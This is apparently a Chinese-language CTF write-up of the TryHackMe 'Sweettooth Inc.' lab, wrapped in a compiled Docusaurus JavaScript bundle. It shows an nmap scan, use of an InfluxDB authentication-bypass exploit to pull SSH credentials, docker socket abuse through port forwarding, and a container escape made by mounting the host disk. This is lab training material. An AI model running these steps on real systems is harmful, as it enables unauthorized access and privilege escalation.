"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[479],{4730:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>a,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>c,toc:()=>d});var o=t(74848),s=t(28453);const r={sidebar_position:122,tags:["Easy","Linux","docker"],title:"Sweettooth Inc.",description:"Sweettooth Inc.",sidebar_label:"Sweettooth Inc.",slug:"/tryhackme/122"},i="Sweettooth Inc.",c={id:"box/TryHackMe/122",title:"Sweettooth Inc.",description:"Sweettooth Inc.",source:"@site/docs/box/TryHackMe/122.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/122",permalink:"/docs/tryhackme/122",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"docker",permalink:"/docs/tags/docker"}],version:"current",sidebarPosition:122,frontMatter:{sidebar_position:122,tags:["Easy","Linux","docker"],title:"Sweettooth Inc.",description:"Sweettooth Inc.",sidebar_label:"Sweettooth Inc.",slug:"/tryhackme/122"},sidebar:"boxSidebar",previous:{title:"RazorBlack",permalink:"/docs/tryhackme/121"},next:{title:"Jacob the Boss",permalink:"/docs/tryhackme/123"}},a={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8086",id:"8086",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"uzJk6Ry98d8C (docker)",id:"uzjk6ry98d8c-docker",level:3},{value:"uzJk6Ry98d8C(docker) \u2014&gt; root (docker)",id:"uzjk6ry98d8cdocker--root-docker",level:3},{value:"root(docker) \u2014&gt; root (physics)",id:"rootdocker--root-physics",level:3}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h1,{id:"sweettooth-inc",children:"Sweettooth Inc."}),"\n",(0,o.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-107-220:~/sweettoothinc# nmap -sTCV -p 111,2222,8086,37603 --min-rate 1000 10.10.176.212\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-28 02:27 BST\nNmap scan report for ip-10-10-176-212.eu-west-1.compute.internal (10.10.176.212)\nHost is up (0.00024s latency).\n\nPORT      STATE SERVICE VERSION\n111/tcp   open  rpcbind 2-4 (RPC #100000)\n| rpcinfo: \n|   program version   port/proto  service\n|   100000  2,3,4        111/tcp  rpcbind\n|   100000  2,3,4        111/udp  rpcbind\n|   100024  1          37603/tcp  status\n|_  100024  1          52370/udp  status\n2222/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)\n| ssh-hostkey: \n|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)\n|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)\n|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)\n|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (EdDSA)\n8086/tcp  open  http    InfluxDB http admin 1.3.0\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n37603/tcp open  status  1 (RPC #100024)\nMAC Address: 02:A9:31:C5:57:65 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.41 seconds\n"})}),"\n",(0,o.jsx)(n.h2,{id:"8086",children:"8086"}),"\n",(0,o.jsxs)(n.p,{children:["\u5728\u5176\u4e0a\u6211\u53d1\u73b0\u5176\u7248\u672c\u6240\u5728, \u67e5\u627e\u76f8\u5173\u7684\u6f0f\u6d1e\u6211\u53d1\u73b0\u4e00\u4e2a\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e ",(0,o.jsx)(n.a,{href:"https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933",children:"InfluxDB-Exploit-CVE-2019-20933"})," \u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\u6211\u8fdb\u884c\u67e5\u770b\u7684\u65f6\u5019\u6211\u53d1\u73b0\u9700\u8981\u7528\u6237\u540d, \u4f46\u662f\u6309\u7167\u5176\u7ed9\u51fa\u7684\u9ed8\u8ba4\u7528\u6237\u540d\u4e5f\u4e0d\u5b58\u5728, \u8fd9\u65f6\u5019\u6211\u770b\u4e86 wp \u610f\u8bc6\u5230\u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a debug \u9875\u9762, \u4ece\u8fd9\u91cc\u6211\u5f97\u5230\u4e86\u4e00\u4e2a\u7528\u6237\u540d\u5e76\u8fdb\u884c\u4e86\u5229\u7528"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-141643.png",alt:"Untitled"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-141643-1.png",alt:"Untitled"})}),"\n",(0,o.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u8fdb\u884c\u641c\u7d22\u7684\u65f6\u5019\u6211\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u6570\u636e\u5e93\u540d\u79f0\u53eb creds , \u6240\u4ee5\u6211\u8fdb\u884c\u4e86\u67e5\u770b\u5e76\u4ece\u5176\u4e2d\u83b7\u53d6\u5230\u4e00\u4e2a SSH \u7528\u6237\u540d\u548c\u5bc6\u7801"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'[o5yY6yya@10.10.176.212/creds] $ SELECT * FROM ssh\n{\n    "results": [\n        {\n            "series": [\n                {\n                    "columns": [\n                        "time",\n                        "pw",\n                        "user"\n                    ],\n                    "name": "ssh",\n                    "values": [\n                        [\n                            "2021-05-16T12:00:00Z",\n                            7788764472,\n                            "uzJk6Ry98d8C"\n                        ]\n                    ]\n                }\n            ],\n            "statement_id": 0\n        }\n    ]\n}\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u83b7\u53d6\u5230\u5176\u4fe1\u606f\u4e4b\u540e\u6211\u4fbf\u8fdb\u884c\u4e86\u767b\u9646"}),"\n",(0,o.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,o.jsx)(n.h3,{id:"uzjk6ry98d8c-docker",children:"uzJk6Ry98d8C (docker)"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-141643-2.png",alt:"Untitled"})}),"\n",(0,o.jsx)(n.p,{children:"\u5728\u767b\u9646\u4e4b\u540e\u6211\u5bf9\u73af\u5883\u8fdb\u884c\u4e86\u67e5\u770b, \u53d1\u73b0\u5176\u662f\u4e00\u4e2a docker \u5bb9\u5668"}),"\n",(0,o.jsx)(n.h3,{id:"uzjk6ry98d8cdocker--root-docker",children:"uzJk6Ry98d8C(docker) \u2014> root (docker)"}),"\n",(0,o.jsx)(n.p,{children:"\u67e5\u770b\u5bb9\u5668\u7684\u8fdb\u7a0b\u6211\u53d1\u73b0\u4e00\u70b9\u5947\u602a\u7684\u5185\u5bb9"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-141643-3.png",alt:"Untitled"})}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsx)(n.li,{children:"\u8fd9\u6761\u547d\u4ee4\u544a\u8bc9\u4e86\u6211\u5bf9\u4e8e docker.sock \u6587\u4ef6\u6709\u6743\u9650\u8fdb\u884c\u64cd\u4f5c, \u8fd9\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u662f\u4e00\u79cd\u6697docker\u7ec4\u7528\u6237"}),"\n",(0,o.jsx)(n.li,{children:"\u8fd9\u6761\u547d\u4ee4\u544a\u8bc9\u6211\u4eec\u5c06\u672c\u5730 8080 \u7aef\u53e3\u6d41\u91cf\u8f6c\u53d1\u5230 docker.sock \u4e2d,\u8fd9\u4e0d\u5c31\u662f\u610f\u5473\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7aef\u53e3\u8f6c\u53d1\u6765\u5b9e\u73b0 docker \u547d\u4ee4"}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"\u8fdb\u884c\u672c\u5730\u7aef\u53e3\u8f6c\u53d1"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-141643-4.png",alt:"Untitled"})}),"\n",(0,o.jsx)(n.p,{children:"\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u6309\u7167 docker \u63d0\u6743\u7684\u65b9\u5f0f\u8fdb\u884c\u64cd\u4f5c\u4e86, \u6211\u8fdb\u884c\u4e86\u4e00\u7cfb\u5217\u7684\u4fe1\u606f\u6536\u96c6\u64cd\u4f5c"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-107-220:~/sweettoothinc# docker -H tcp://127.0.0.1:1234 images\nREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE\nsweettoothinc       latest              26a697c0d00f        2 years ago         359MB\ninfluxdb            1.3.0               e1b5eda429c3        6 years ago         227MB\nroot@ip-10-10-107-220:~/sweettoothinc# docker -H tcp://127.0.0.1:1234 ps\nCONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS              PORTS                                          NAMES\nffe946afd3ce        sweettoothinc:latest   "/bin/bash -c \'chmod\\u2026"   About an hour ago   Up About an hour    0.0.0.0:8086->8086/tcp, 0.0.0.0:2222->22/tcp   sweettoothinc\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u672c\u6765\u6211\u60f3\u7684\u662f\u6302\u8f7d\u76ee\u5f55\u62ffshell , \u4f46\u662f\u8fd9\u4e24\u4e2a\u955c\u50cf\u6ca1\u6cd5\u64cd\u4f5c, \u6700\u540e\u53ea\u80fd\u8fdb\u884c\u6267\u884c\u547d\u4ee4"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-141643-5.png",alt:"Untitled"})}),"\n",(0,o.jsx)(n.p,{children:"\u6b64\u65f6\u6211\u4eec\u5c31\u83b7\u53d6\u5230\u4e86\u5bb9\u5668\u7684 Bash Shell"}),"\n",(0,o.jsx)(n.h3,{id:"rootdocker--root-physics",children:"root(docker) \u2014> root (physics)"}),"\n",(0,o.jsx)(n.p,{children:"\u6211\u4eec\u5728\u6b64\u83b7\u53d6\u5230\u7684 Shell , \u53d1\u73b0\u6709\u4e00\u4e2a\u7cfb\u7edf\u78c1\u76d8"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@ffe946afd3ce:/# fdisk -l\n\nDisk /dev/xvda: 16 GiB, 17179869184 bytes, 33554432 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: dos\nDisk identifier: 0xa8257195\n\nDevice     Boot    Start      End  Sectors  Size Id Type\n/dev/xvda1 *        2048 32088063 32086016 15.3G 83 Linux\n/dev/xvda2      32090110 33552383  1462274  714M  5 Extended\n/dev/xvda5      32090112 33552383  1462272  714M 82 Linux swap / Solaris\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u6302\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u64cd\u4f5c"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@ffe946afd3ce:/# mkdir /mnt/mydisk\nroot@ffe946afd3ce:/# mount  /dev/xvda1 /mnt/mydisk\nroot@ffe946afd3ce:/# cd /mnt/mydisk/\nroot@ffe946afd3ce:/mnt/mydisk# ls\nbin  boot  dev\tetc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt\tproc  root  run  sbin  srv  sys  tmp  usr  var\tvmlinuz  vmlinuz.old\n"})})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>c});var o=t(96540);const s={},r=o.createContext(s);function i(e){const n=o.useContext(r);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),o.createElement(r.Provider,{value:n},e.children)}}}]);